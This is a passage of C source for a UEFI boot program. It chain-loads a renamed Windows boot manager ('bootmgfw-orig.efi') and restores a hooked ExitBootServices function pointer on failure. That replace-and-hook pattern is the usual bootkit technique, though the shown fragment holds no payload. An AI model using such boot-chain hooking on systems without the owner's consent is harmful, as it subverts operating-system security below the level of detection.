    Status = LoadAndExecuteImage(ImageHandle, SystemTable, L"\\EFI\\Microsoft\\Boot\\bootmgfw-orig.efi");

    if (EFI_ERROR(Status)) {
        Print(L"ERROR: Failed to load bootmgfw.efi (0x%lx),\n", Status);

    }
    
    // If we reach this point, we failed to load any bootloader
    if (EFI_ERROR(Status)) {
        Print(L"Failed to load any bootloader. System halted.\n");
        Print(L"Press any key to shutdown...\n");
        uefi_call_wrapper(SystemTable->BootServices->WaitForEvent, 3, 1, &SystemTable->ConIn->WaitForKey, &Index);
        uefi_call_wrapper(SystemTable->ConIn->ReadKeyStroke, 2, SystemTable->ConIn, &Key);
        
        // Restore original ExitBootServices before returning
        if (OriginalExitBootServices != NULL) {
            SystemTable->BootServices->ExitBootServices = OriginalExitBootServices;
        }
    }
    
    return Status;
}